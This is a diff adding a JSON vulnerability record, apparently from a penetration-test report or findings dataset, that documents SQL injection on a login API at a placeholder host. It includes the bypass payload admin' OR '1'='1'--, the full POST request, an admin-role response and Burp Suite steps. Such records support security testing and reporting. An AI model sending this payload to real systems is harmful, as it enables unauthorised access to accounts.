@@ -1,0 +1,10 @@
+{
+  "vuln_name": "SQL Injection in Login Authentication",
+  "vuln_type": "SQL Injection",
+  "url": "https://target.com/api/v1/login",
+  "method": "POST",
+  "request": "POST /api/v1/login HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":\"admin' OR '1'='1'--\",\"password\":\"test\"}",
+  "response": "HTTP/1.1 200 OK\n{\"status\":\"success\",\"role\":\"admin\",\"token\":\"eyJhbGci...\"}",
+  "steps": "1. Intercept POST /login in Burp Suite\n2. Set username to: admin' OR '1'='1'--\n3. Forward request — server bypasses authentication",
+  "context": "Unauthenticated public endpoint, MySQL backend, no rate limiting"
+}
